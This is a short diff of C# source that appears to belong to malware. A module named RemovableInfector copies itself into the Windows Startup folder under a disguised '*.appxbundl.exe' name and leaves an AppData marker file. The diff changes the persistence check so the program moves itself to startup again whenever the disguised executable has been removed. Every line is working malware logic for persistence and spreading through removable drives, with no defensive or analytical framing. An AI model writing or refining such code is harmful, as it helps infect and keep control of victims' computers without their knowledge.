@@ -280,14 +280,22 @@ namespace zort
                 string attribPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "22SWTARDED.DAT");
                 string startupPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup));
                 string[] startupFiles = Directory.GetFiles(startupPath, "*.appxbundl.exe");
-                if (!File.Exists(attribPath) || startupFiles.Length > 0)
+                if (!File.Exists(attribPath))
                 {
                     PersistenceHelper.MoveAndRunFromStartup();
                     File.WriteAllBytes(attribPath, new byte[] { 0x01 });
                 } else
                 {
-                    ModuleLogger.Log(typeof(RemovableInfector), "Already moved to startup. Exiting.");
-                    Environment.Exit(0);
+                    if (startupFiles.Length <= 0)
+                    {
+                        PersistenceHelper.MoveAndRunFromStartup();
+                        File.WriteAllBytes(attribPath, new byte[] { 0x01 });
+                    }
+                    else
+                    {
+                        ModuleLogger.Log(typeof(RemovableInfector), "Already moved to startup. Exiting.");
+                        Environment.Exit(0);
+                    }
                 }
             } else
             {
